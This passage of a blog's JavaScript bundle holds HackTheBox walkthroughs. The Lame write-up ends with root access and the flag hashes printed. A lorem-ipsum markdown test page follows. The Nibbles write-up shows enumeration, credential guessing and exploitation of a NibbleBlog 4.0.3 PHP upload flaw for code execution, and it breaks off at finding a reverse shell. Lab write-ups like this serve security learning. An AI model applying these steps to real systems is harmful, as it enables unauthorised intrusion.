8888</code></pre><p>On the first pane, the exploit is being executed, and on the second one, a connection is received coming from the target.</p>\n<p><img src=\"Lame.assets/image-20210423055920733.png\" alt=\"\"></p>\n<p>After exploiting, the shell is already running as root.</p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f</code></pre><p><img src=\"Lame.assets/image-20210423060412613.png\" alt=\"\"></p>\n<p>the <strong>user.txt</strong> file is located in user <strong>makis</strong> home folder.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/makis/user.txt</code></pre><p><img src=\"Lame.assets/image-20210423060516976.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>43bf1c6bb6f868ad4e55452e7db7eeb1</code></p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Lame.assets/image-20210423060921071.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>a8221b5e4e0a0535e87eae265190c232</code></p>\n</blockquote>\n","date":"2021-04-23","excerpt":"","printDate":"April 23, 2021","printReadingTime":"3 min read"};

var route_12 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod6
});

var Mod7 = {"title":"Markdown Test Page","slug":"markdown-test","html":"<p>This page is an adapted version of <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/fullpipe/markdown-test-page\">markdown-test-page</a>. It should give you an idea of how different elements are styled on this template.</p>\n<h2 id=\"a-nametopa-table-of-contents\"><a name=\"top\"></a> Table of Contents</h2>\n<ul>\n<li><a onclick=\"document.location.hash='Headings';\" href=\"javascript:;\">Headings</a></li>\n<li><a onclick=\"document.location.hash='Paragraphs';\" href=\"javascript:;\">Paragraphs</a></li>\n<li><a onclick=\"document.location.hash='Blockquotes';\" href=\"javascript:;\">Blockquotes</a></li>\n<li><a onclick=\"document.location.hash='Lists';\" href=\"javascript:;\">Lists</a></li>\n<li><a onclick=\"document.location.hash='Horizontal';\" href=\"javascript:;\">Horizontal rule</a></li>\n<li><a onclick=\"document.location.hash='Table';\" href=\"javascript:;\">Table</a></li>\n<li><a onclick=\"document.location.hash='Code';\" href=\"javascript:;\">Code</a></li>\n<li><a onclick=\"document.location.hash='Inline';\" href=\"javascript:;\">Inline elements</a></li>\n</ul>\n<hr>\n<h1 id=\"a-nameheadingsaheadings\"><a name=\"Headings\"></a>Headings</h1>\n<h1 id=\"heading-one\">Heading one</h1>\n<p>Sint sit cillum pariatur eiusmod nulla pariatur ipsum. Sit laborum anim qui mollit tempor pariatur nisi minim dolor. Aliquip et adipisicing sit sit fugiat commodo id sunt. Nostrud enim ad commodo incididunt cupidatat in ullamco ullamco Lorem cupidatat velit enim et Lorem. Ut laborum cillum laboris fugiat culpa sint irure do reprehenderit culpa occaecat. Exercitation esse mollit tempor magna aliqua in occaecat aliquip veniam reprehenderit nisi dolor in laboris dolore velit.</p>\n<h2 id=\"heading-two\">Heading two</h2>\n<p>Aute officia nulla deserunt do deserunt cillum velit magna. Officia veniam culpa anim minim dolore labore pariatur voluptate id ad est duis quis velit dolor pariatur enim. Incididunt enim excepteur do veniam consequat culpa do voluptate dolor fugiat ad adipisicing sit. Labore officia est adipisicing dolore proident eiusmod exercitation deserunt ullamco anim do occaecat velit. Elit dolor consectetur proident sunt aliquip est do tempor quis aliqua culpa aute. Duis in tempor exercitation pariatur et adipisicing mollit irure tempor ut enim esse commodo laboris proident. Do excepteur laborum anim esse aliquip eu sit id Lorem incididunt elit irure ea nulla dolor et. Nulla amet fugiat qui minim deserunt enim eu cupidatat aute officia do velit ea reprehenderit.</p>\n<h3 id=\"heading-three\">Heading three</h3>\n<p>Voluptate cupidatat cillum elit quis ipsum eu voluptate fugiat consectetur enim. Quis ut voluptate culpa ex anim aute consectetur dolore proident voluptate exercitation eiusmod. Esse in do anim magna minim culpa sint. Adipisicing ipsum consectetur proident ullamco magna sit amet aliqua aute fugiat laborum exercitation duis et.</p>\n<h4 id=\"heading-four\">Heading four</h4>\n<p>Commodo fugiat aliqua minim quis pariatur mollit id tempor. Non occaecat minim esse enim aliqua adipisicing nostrud duis consequat eu adipisicing qui. Minim aliquip sit excepteur ipsum consequat laborum pariatur excepteur. Veniam fugiat et amet ad elit anim laborum duis mollit occaecat et et ipsum et reprehenderit. Occaecat aliquip dolore adipisicing sint labore occaecat officia fugiat. Quis adipisicing exercitation exercitation eu amet est laboris sunt nostrud ipsum reprehenderit ullamco. Enim sint ut consectetur id anim aute voluptate exercitation mollit dolore magna magna est Lorem. Ut adipisicing adipisicing aliqua ullamco voluptate labore nisi tempor esse magna incididunt.</p>\n<h5 id=\"heading-five\">Heading five</h5>\n<p>Veniam enim esse amet veniam deserunt laboris amet enim consequat. Minim nostrud deserunt cillum consectetur commodo eu enim nostrud ullamco occaecat excepteur. Aliquip et ut est commodo enim dolor amet sint excepteur. Amet ad laboris laborum deserunt sint sunt aliqua commodo ex duis deserunt enim est ex labore ut. Duis incididunt velit adipisicing non incididunt adipisicing adipisicing. Ad irure duis nisi tempor eu dolor fugiat magna et consequat tempor eu ex dolore. Mollit esse nisi qui culpa ut nisi ex proident culpa cupidatat cillum culpa occaecat anim. Ut officia sit ea nisi ea excepteur nostrud ipsum et nulla.</p>\n<h6 id=\"heading-six\">Heading six</h6>\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nameparagraphsaparagraphs\"><a name=\"Paragraphs\"></a>Paragraphs</h1>\n<p>Incididunt ex adipisicing ea ullamco consectetur in voluptate proident fugiat tempor deserunt reprehenderit ullamco id dolore laborum. Do laboris laboris minim incididunt qui consectetur exercitation adipisicing dolore et magna consequat magna anim sunt. Officia fugiat Lorem sunt pariatur incididunt Lorem reprehenderit proident irure. Dolore ipsum aliqua mollit ad officia fugiat sit eu aliquip cupidatat ipsum duis laborum laborum fugiat esse. Voluptate anim ex dolore deserunt ea ex eiusmod irure. Occaecat excepteur aliqua exercitation aliquip dolor esse eu eu.</p>\n<p>Officia dolore laborum aute incididunt commodo nisi velit est est elit et dolore elit exercitation. Enim aliquip magna id ipsum aliquip consectetur ad nulla quis. Incididunt pariatur dolor consectetur cillum enim velit cupidatat laborum quis ex.</p>\n<p>Officia irure in non voluptate adipisicing sit amet tempor duis dolore deserunt enim ut. Reprehenderit incididunt in ad anim et deserunt deserunt Lorem laborum quis. Enim aute anim labore proident laboris voluptate elit excepteur in. Ex labore nulla velit officia ullamco Lorem Lorem id do. Dolore ullamco ipsum magna dolor pariatur voluptate ipsum id occaecat ipsum. Dolore tempor quis duis commodo quis quis enim.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nameblockquotesablockquotes\"><a name=\"Blockquotes\"></a>Blockquotes</h1>\n<p>Ad nisi laborum aute cupidatat magna deserunt eu id laboris id. Aliquip nulla cupidatat sint ex Lorem mollit laborum dolor amet est ut esse aute. Nostrud ex consequat id incididunt proident ipsum minim duis aliqua ut ex et ad quis. Laborum sint esse cillum anim nulla cillum consectetur aliqua sit. Nisi excepteur cillum labore amet excepteur commodo enim occaecat consequat ipsum proident exercitation duis id in.</p>\n<blockquote>\n<p>Ipsum et cupidatat mollit exercitation enim duis sunt irure aliqua reprehenderit mollit. Pariatur Lorem pariatur laboris do culpa do elit irure. Eiusmod amet nulla voluptate velit culpa et aliqua ad reprehenderit sit ut.</p>\n</blockquote>\n<p>Labore ea magna Lorem consequat aliquip consectetur cillum duis dolore. Et veniam dolor qui incididunt minim amet laboris sit. Dolore ad esse commodo et dolore amet est velit ut nisi ea. Excepteur ea nulla commodo dolore anim dolore adipisicing eiusmod labore id enim esse quis mollit deserunt est. Minim ea culpa voluptate nostrud commodo proident in duis aliquip minim.</p>\n<blockquote>\n<p>Qui est sit et reprehenderit aute est esse enim aliqua id aliquip ea anim. Pariatur sint reprehenderit mollit velit voluptate enim consectetur sint enim. Quis exercitation proident elit non id qui culpa dolore esse aliquip consequat.</p>\n</blockquote>\n<p>Ipsum excepteur cupidatat sunt minim ad eiusmod tempor sit.</p>\n<blockquote>\n<p>Deserunt excepteur adipisicing culpa pariatur cillum laboris ullamco nisi fugiat cillum officia. In cupidatat nulla aliquip tempor ad Lorem Lorem quis voluptate officia consectetur pariatur ex in est duis. Mollit id esse est elit exercitation voluptate nostrud nisi laborum magna dolore dolore tempor in est consectetur.</p>\n</blockquote>\n<p>Adipisicing voluptate ipsum culpa voluptate id aute laboris labore esse fugiat veniam ullamco occaecat do ut. Tempor et esse reprehenderit veniam proident ipsum irure sit ullamco et labore ea excepteur nulla labore ut. Ex aute minim quis tempor in eu id id irure ea nostrud dolor esse.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-namelistsalists\"><a name=\"Lists\"></a>Lists</h1>\n<h3 id=\"ordered-list\">Ordered List</h3>\n<ol>\n<li>Longan</li>\n<li>Lychee</li>\n<li>Excepteur ad cupidatat do elit laborum amet cillum reprehenderit consequat quis.\nDeserunt officia esse aliquip consectetur duis ut labore laborum commodo aliquip aliquip velit pariatur dolore.</li>\n<li>Marionberry</li>\n<li>Melon<ul>\n<li>Cantaloupe</li>\n<li>Honeydew</li>\n<li>Watermelon</li>\n</ul>\n</li>\n<li>Miracle fruit</li>\n<li>Mulberry</li>\n</ol>\n<h3 id=\"unordered-list\">Unordered List</h3>\n<ul>\n<li>Olive</li>\n<li>Orange<ul>\n<li>Blood orange</li>\n<li>Clementine</li>\n</ul>\n</li>\n<li>Papaya</li>\n<li>Ut aute ipsum occaecat nisi culpa Lorem id occaecat cupidatat id id magna laboris ad duis. Fugiat cillum dolore veniam nostrud proident sint consectetur eiusmod irure adipisicing.</li>\n<li>Passionfruit</li>\n</ul>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-namehorizontalahorizontal-rule\"><a name=\"Horizontal\"></a>Horizontal rule</h1>\n<p>In dolore velit aliquip labore mollit minim tempor veniam eu veniam ad in sint aliquip mollit mollit. Ex occaecat non deserunt elit laborum sunt tempor sint consequat culpa culpa qui sit. Irure ad commodo eu voluptate mollit cillum cupidatat veniam proident amet minim reprehenderit.</p>\n<hr>\n<p>In laboris eiusmod reprehenderit aliquip sit proident occaecat. Non sit labore anim elit veniam Lorem minim commodo eiusmod irure do minim nisi. Dolor amet cillum excepteur consequat sint non sint.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nametableatable\"><a name=\"Table\"></a>Table</h1>\n<p>Duis sunt ut pariatur reprehenderit mollit mollit magna dolore in pariatur nulla commodo sit dolor ad fugiat. Laboris amet ea occaecat duis eu enim exercitation deserunt ea laborum occaecat reprehenderit. Et incididunt dolor commodo consequat mollit nisi proident non pariatur in et incididunt id. Eu ut et Lorem ea ex magna minim ipsum ipsum do.</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Table Heading 1</th>\n<th align=\"left\">Table Heading 2</th>\n<th align=\"center\">Center align</th>\n<th align=\"right\">Right align</th>\n<th align=\"left\">Table Heading 5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n</tbody></table>\n<p>Minim id consequat adipisicing cupidatat laborum culpa veniam non consectetur et duis pariatur reprehenderit eu ex consectetur. Sunt nisi qui eiusmod ut cillum laborum Lorem officia aliquip laboris ullamco nostrud laboris non irure laboris. Cillum dolore labore Lorem deserunt mollit voluptate esse incididunt ex dolor.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-namecodeacode\"><a name=\"Code\"></a>Code</h1>\n<h2 id=\"inline-code\">Inline code</h2>\n<p>Ad amet irure est magna id mollit Lorem in do duis enim. Excepteur velit nisi magna ea pariatur pariatur ullamco fugiat deserunt sint non sint. Duis duis est <code>code in text</code> velit velit aute culpa ex quis pariatur pariatur laborum aute pariatur duis tempor sunt ad. Irure magna voluptate dolore consectetur consectetur irure esse. Anim magna <code>&lt;strong&gt;in culpa qui officia&lt;/strong&gt;</code> dolor eiusmod esse amet aute cupidatat aliqua do id voluptate cupidatat reprehenderit amet labore deserunt.</p>\n<h2 id=\"highlighted\">Highlighted</h2>\n<p>Et fugiat ad nisi amet magna labore do cillum fugiat occaecat cillum Lorem proident. In sint dolor ullamco ad do adipisicing amet id excepteur Lorem aliquip sit irure veniam laborum duis cillum. Aliqua occaecat minim cillum deserunt magna sunt laboris do do irure ea nostrud consequat ut voluptate ex.</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>md:flex<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>md:flex-shrink-0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span>\n      <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>rounded-lg md:w-56<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://images.unsplash.com/photo-1556740738-b6a63e27c4df?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=448&amp;q=80<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Woman paying for a purchase<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>mt-4 md:mt-0 md:ml-6<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>uppercase tracking-wide text-sm text-indigo-600 font-bold<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      Marketing\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span>\n      <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>block mt-1 text-lg leading-tight font-semibold text-gray-900 hover:underline<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token punctuation\">></span></span>Finding customers for your new business<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span>\n    <span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>mt-2 text-gray-600<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      Getting a new business off the ground is a lot of hard work. Here are five\n      ideas you can use to find your first customers.\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><p>Ex amet id ex aliquip id do laborum excepteur exercitation elit sint commodo occaecat nostrud est. Nostrud pariatur esse veniam laborum non sint magna sit laboris minim in id. Aliqua pariatur pariatur excepteur adipisicing irure culpa consequat commodo et ex id ad.</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">let</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">handleClick</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\"><span class=\"token namespace\">on:</span>click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{handleClick}<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  Clicked {count} {count === 1 ? 'time' : 'times'}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre><p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nameinlineainline-elements\"><a name=\"Inline\"></a>Inline elements</h1>\n<p>Sint ea anim ipsum ad commodo cupidatat do <strong>exercitation</strong> incididunt et minim ad labore sunt. Minim deserunt labore laboris velit nulla incididunt ipsum nulla. Ullamco ad laborum ea qui et anim in laboris exercitation tempor sit officia laborum reprehenderit culpa velit quis. <strong>Consequat commodo</strong> reprehenderit duis <a onclick=\"document.location.hash='';\" href=\"javascript:;\">irure</a> esse esse exercitation minim enim Lorem dolore duis irure. Nisi Lorem reprehenderit ea amet excepteur dolor excepteur magna labore proident voluptate ipsum. Reprehenderit ex esse deserunt aliqua ea officia mollit Lorem nulla magna enim. Et ad ipsum labore enim ipsum <strong>cupidatat consequat</strong>. Commodo non ea cupidatat magna deserunt dolore ipsum velit nulla elit veniam nulla eiusmod proident officia.</p>\n<p><img src=\"https://placekitten.com/1280/800\" alt=\"Super wide\"></p>\n<p><em>Proident sit veniam in est proident officia adipisicing</em> ea tempor cillum non cillum velit deserunt. Voluptate laborum incididunt sit consectetur Lorem irure incididunt voluptate nostrud. Commodo ut eiusmod tempor cupidatat esse enim minim ex anim consequat. Mollit sint culpa qui laboris quis consectetur ad sint esse. Amet anim anim minim ullamco et duis non irure. Sit tempor adipisicing ea laboris <code>culpa ex duis sint</code> anim aute reprehenderit id eu ea. Aute <a onclick=\"document.location.hash='';\" href=\"javascript:;\">excepteur proident</a> Lorem minim adipisicing nostrud mollit ad ut voluptate do nulla esse occaecat aliqua sint anim.</p>\n<p><img src=\"https://placekitten.com/480/400\" alt=\"Not so big\"></p>\n<p>Incididunt in culpa cupidatat mollit cillum qui proident sit. In cillum aliquip incididunt voluptate magna amet cupidatat cillum pariatur sint aliqua est <em>enim <strong>anim</strong> voluptate</em>. Magna aliquip proident incididunt id duis pariatur eiusmod incididunt commodo culpa dolore sit. Culpa do nostrud elit ad exercitation anim pariatur non minim nisi <strong>adipisicing sunt <em>officia</em></strong>. Do deserunt magna mollit Lorem commodo ipsum do cupidatat mollit enim ut elit veniam ea voluptate.</p>\n<iframe width=\"100%\" height=\"400\" src=\"https://www.youtube.com/embed/PCp2iXA1uLE\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n\n<p>Reprehenderit non eu quis in ad elit esse qui aute id <a onclick=\"document.location.hash='';\" href=\"javascript:;\">incididunt</a> dolore cillum. Esse laboris consequat dolor anim exercitation tempor aliqua deserunt velit magna laboris. Culpa culpa minim duis amet mollit do quis amet commodo nulla irure.</p>\n","date":"2021-01-30","excerpt":"\nA sample page with the most common elements of an article, including headings, paragraphs, lists, and images.\nUse it as a starting point for applying your own styles.\n\n","printDate":"January 30, 2021","printReadingTime":"11 min read"};

var route_2 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod7
});

var Mod8 = {"title":"HTB - Nibbles","slug":"Nibbles","html":"<h1 id=\"nibbles---10101075\">Nibbles - 10.10.10.75</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.75</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 21:14 EDT\nNmap scan report for 10.10.10.75\nHost is up (0.24s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site does not have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 39.85 seconds</code></pre><h2 id=\"website\">Website</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -svk \"http://10.10.10.75\" | grep . </code></pre><p>The command above is a quick way to see what is on the webpage without opening it in a browser. And it shows much more than what is displayed on the browser such as <strong>headers</strong> and <strong>html comments</strong>. The server header can be crossed check with the nmap results. The comment indicates that there is a directory named <strong>nibbleblog</strong> on the server.</p>\n<p><img src=\"Nibbles.assets/image-20210426221502521.png\" alt=\"\"></p>\n<h2 id=\"gobuster\">Gobuster</h2>\n<p>Enumerating the Apache webserver with gobuster.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o log/gobuster.out -u http://10.10.10.75/nibbleblog</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">/.htpasswd            (Status: 403) [Size: 306]\n/README               (Status: 200) [Size: 4628]\n/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2992]\n/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]\n/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">curl -sk \"http://10.10.10.75/nibbleblog/README\"</code></pre><p>Upon inspecting the <strong>README</strong> file, the <strong>version</strong>, <strong>release date</strong> and <strong>technologies</strong> used by the Content Management System (CMS) is discovered.</p>\n<p><img src=\"Nibbles.assets/image-20210426223306827.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -sk \"http://10.10.10.75/nibbleblog/content/\"</code></pre><p>When viewing the content page, it has directory listing enable.</p>\n<p><img src=\"Nibbles.assets/image-20210426223956036.png\" alt=\"\"></p>\n<p><img src=\"Nibbles.assets/image-20210426224823227.png\" alt=\"\"></p>\n<p>On viewing the <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.75/nibbleblog/content/private/users.xml\">http://10.10.10.75/nibbleblog/content/private/users.xml</a> file, there is only one user, <strong>admin</strong>, and it appears to have an <strong>IP filtering blacklist</strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210426225010279.png\" alt=\"\"></p>\n<p>Since it is likely that the attacker gets blocked if they try a password bruteforce attack, the config file can be used as a hint for potential password. Also <strong>nibbleblog does not offer any default credentials</strong> that can be used.</p>\n<p>Potential password for user <strong>admin</strong>: </p>\n<ul>\n<li>admin</li>\n<li>nibbleblog</li>\n<li>nibbles</li>\n<li>yumyum</li>\n</ul>\n<p><img src=\"Nibbles.assets/image-20210426225731825.png\" alt=\"\"></p>\n<p>Bad login attempts are recorded with the attacker&#39;s IP.</p>\n<p><img src=\"Nibbles.assets/image-20210426230421923.png\" alt=\"\"></p>\n<p>The attacker can successfully login using the credentials <strong><code>admin:nibbles</code></strong>.</p>\n<p><img src=\"Nibbles.assets/image-20210426230436563.png\" alt=\"\"></p>\n<h2 id=\"searchsploit\">Searchsploit</h2>\n<p>Searchsploit is used to search for a known exploit for: <strong>nibbleblog</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit nibbleblog</code></pre><p><img src=\"Nibbles.assets/image-20210426230732546.png\" alt=\"\"></p>\n<p>A metasploit exploit can be found for this exact nibbleblog version.</p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>When uploading image files via the &quot;My image&quot; plugin - which is delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the original extension of uploaded files. This extension or the actual file type are not checked, thus it is possible to upload PHP files and gain code execution. </p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html\">https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html</a></p>\n<h3 id=\"proof-of-concept\">Proof Of Concept</h3>\n<p>The metasploit exploit can be easily replicated manually without using metasploit.</p>\n<p>A simple php script is created. When testing exploits, it is highly recommended to keep the proof of concept as simple as possible as it is less likely to be blocked. </p>\n<p>Example: <code>echo</code> is less likely to be blocked compared to <code>exec</code> or <code>system</code>. </p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token prolog\">&lt;?php \n    echo \"test test test\";\n?></span></code></pre><p>Upload URL: <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image\">http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</a></p>\n<p>RCE URL: <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php\">http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</a></p>\n<p><img src=\"Nibbles.assets/image-20210426235230027.png\" alt=\"\"></p>\n<p><img src=\"Nibbles.assets/image-20210426235348283.png\" alt=\"\"></p>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>On kali linux, these are some default location where php reverse shells can be found.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ locate php-reverse                                                                             